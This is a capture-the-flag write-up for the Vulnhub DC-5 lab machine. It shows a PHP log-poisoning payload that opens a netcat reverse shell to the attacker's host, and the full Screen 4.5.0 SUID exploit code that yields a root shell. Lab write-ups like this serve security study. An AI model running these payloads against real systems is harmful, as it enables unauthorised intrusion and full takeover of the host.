<h1>DC-5 Write-up</h1>

<h2>NMAP</h2>

```
# Nmap 7.70 scan initiated Thu Sep 26 17:06:46 2019 as: nmap -sC -sV -oN nmap -v -p80,111,41608 192.168.56.50
Nmap scan report for 192.168.56.50
Host is up (0.00017s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.6.2
111/tcp   open  rpcbind 2-4 (RPC #100000)
41608/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:08:5D:1B (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 26 17:08:09 2019 -- 1 IP address (1 host up) scanned in 82.86 seconds

```
<h2>PORT 80</h2>

**Found LFI on web**

i wfuzz thankyou.php page with /thankyou.php?FUZZ=FUZZ

Found : http://192.168.56.50/thankyou.php?file=/etc/passwd

LFI TO SHELL:

* curl -A ```<?php echo exec('nc 192.168.56.1 1234 -e /bin/bash'); ?>``` http://192.168.56.50/
* nc -lvp 1234
* http://192.168.56.50/thankyou.php?file=/var/log/nginx/access.log  #REFRESH PAGE IF SHELL IS NOT COMING 

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-5/images/wwwshell.png)

<h2>Privilege Esclation :</h2>

Exploit: https://www.exploit-db.com/exploits/41154

<h3>Screen 4.5.0 SUID Exploit :</h3>

**NOTE : YOU NEED TO COMPILE THIS EXPLOIT IN YOUR OWN MACHINE AND THEN SEND TO DC-5 BOX**

```
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
```

```
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
```

```
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
```

```
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
```

NOW TRANSFER BOTH FILE IN DC-5 IN /tmp then

```
cd /etc
umask 000
/bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
/bin/screen-4.5.0 -ls
/tmp/rootshell
```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-5/images/rootflag%20and%20privesc.png)
